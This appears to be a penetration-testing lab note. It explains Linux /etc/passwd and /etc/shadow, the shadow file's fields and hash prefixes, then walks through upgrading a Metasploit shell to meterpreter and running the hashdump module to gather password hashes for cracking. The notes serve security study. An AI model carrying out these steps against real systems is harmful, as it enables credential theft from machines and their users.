# Linux: Dump & Crack Password Hashes

## Files Relevant to Password Hashes
- Linux has mult-user support and as a result multiple users can access the system simultaneously.
- This can be seen as both an advantage and a disadvantage from a security perspective.
- Multiple accounts offer multiple access vectors for attakers and therefore increase the overall risk of the server/system.

### /etc/passwd
- All of the information for all accounts on Linux is stored in the `/etc/passwd` file.
- We cannot view the passwords for the users in the passwd file because they are encrypted and the passwd file is readable by any user on the system. 

### /etc/shadow
- All the encrypted passwords for the users are stored in the `/etc/shadow` file. 
- The shadow file can only be accessed and read by root (or a user account who is part of the root group or who has sudo privileges).
- This is a very important security feature as it prevents other accounts on the system from accessing the hashed passwords.

## Linux Password Hashes
- The `/etc/shadow` file gives us information in regards to the **hashing algorithm** that is being used and the password hash.
- This is very helpful as we are able to determine the type of hashing algorithm that is being used and its strength.
- We can determine this by looking at the number after the username encapsulated (prefixed) by the dollar sign symbol.

### Colon Delimited Fields

| # | Field | Description |
|---| ----- | ------------|
| 1 | username | A valid account name, which exist on the system |
| 2 | password | Enrypted password; hash indicated by `$#$` |
| 3 | Last password change | The date of the last password change, expressed as the number of days since Jan 1, 1970 (Unix time).  | 
| 4 | Minimum password age | The minimum number of days required between password changes | 
| 5 | Maximum password age | The maximum number of days the password is valid | 
| 6 | Warning period | The number of days before expiry when user is warned to change password | 
| 7 | Inactivity period | The number of days after expiry that account is disabled | 
| 8 | Expiration date | The account expiry date (unix time) | 
| 9 | Unused | n/a |

### Password Field & Hash Algorithm
- Your encrypted password is in hash format.
- The password should be minimum 15-20 characters long including special characters, digits, lower case alphabetic and more.
- Usually password format is set to `$id$salt$hashed`, The `$id` is the algorithm prefix used On GNU/Linux as follows:
  - `$1$` is MD5
  - `$2a$` is Blowfish
  - `$2y$` is Eksblowfish
  - `$5$` is SHA-256
  - `$6$` is SHA-512
  - `$y$` is yescrypt
- MD5 and Blowfish are fairly easy to crack. 

## MetaSploit: Hashdump
> This is from a lab. The assumption is that you have gained initial and root access to a Linux machine.

## The Setup
- Assumption: You gained an interactive shell (`/bin/bash -i`) from your initial exploit using MetaSploit.
- Assumption: You have root access, but shell only.
- Background your shell session (ctrl-z or bg or background).

## Upgrade Your Session
```
> sessions -u 1
```
- `-u` is for upgrade
- `1`  is the session id number for your shell access to the target
- When you hit enter you should get a meterpreter session in additional to your shell session.
- Background your meterpreter session (ctrl-z or bg or background).

## Dump the Password Hashes
```
> search hashdump
  # Looking for the Linux hashdump module
> use /post/linux/gather/hashdump
> show options
> set SESSION [meterpreter session id#]
> run
```
- This will automagically get all the user accounts that have passwords and therefore hashes.
- Metasploit will save those hashes in a special "unshadowed" file.
- That file contains the hashes in a form ready to be cracked.
